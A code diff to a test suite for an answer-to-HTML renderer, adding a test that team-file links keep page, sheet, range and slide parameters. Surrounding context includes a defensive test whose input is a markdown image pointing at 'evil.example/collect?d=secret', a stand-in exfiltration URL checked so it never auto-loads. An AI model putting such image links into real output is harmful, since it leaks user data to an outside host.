@@ -56,6 +56,17 @@ describe('answer HTML', () => {
     expect(out).toContain(' note')
   })
 
+  test('team-file links keep every query parameter the link had: page, sheet and range, slide and any other', () => {
+    const out = html(
+      '[p.12](/files/view?path=docs%2Freport.pdf&page=12) [매출](/files/view?path=fin%2Fq3.xlsx&sheet=%EB%A7%A4%EC%B6%9C&range=A12:F12) [s3](/files/view?path=deck.pptx&slide=3&from=answer) [dl](/api/files/download?path=docs%2Fa.pdf&page=2&disposition=attachment)',
+    )
+    expect(out).toContain(`<a href="${ORIGIN}/files/view?path=docs%2Freport.pdf&amp;page=12">p.12</a>`)
+    expect(out).toContain(`<a href="${ORIGIN}/files/view?path=fin%2Fq3.xlsx&amp;sheet=%EB%A7%A4%EC%B6%9C&amp;range=A12:F12">매출</a>`)
+    expect(out).toContain(`<a href="${ORIGIN}/files/view?path=deck.pptx&amp;slide=3&amp;from=answer">s3</a>`)
+    // a download link becomes the preview, at the same page; its own disposition is not part of the preview
+    expect(out).toContain(`<a href="${ORIGIN}/files/view?path=docs%2Fa.pdf&amp;page=2">dl</a>`)
+  })
+
   test('nothing loads by itself where it is pasted: external and team images become links', () => {
     const out = html('![chart](https://evil.example/collect?d=secret)\n\n![](/api/files/download?path=shared%2Fchart.png)\n\n![dot](data:image/png;base64,iVBORw0KGgo=)')
     expect(out).not.toMatch(/<img[^>]*evil\.example/)
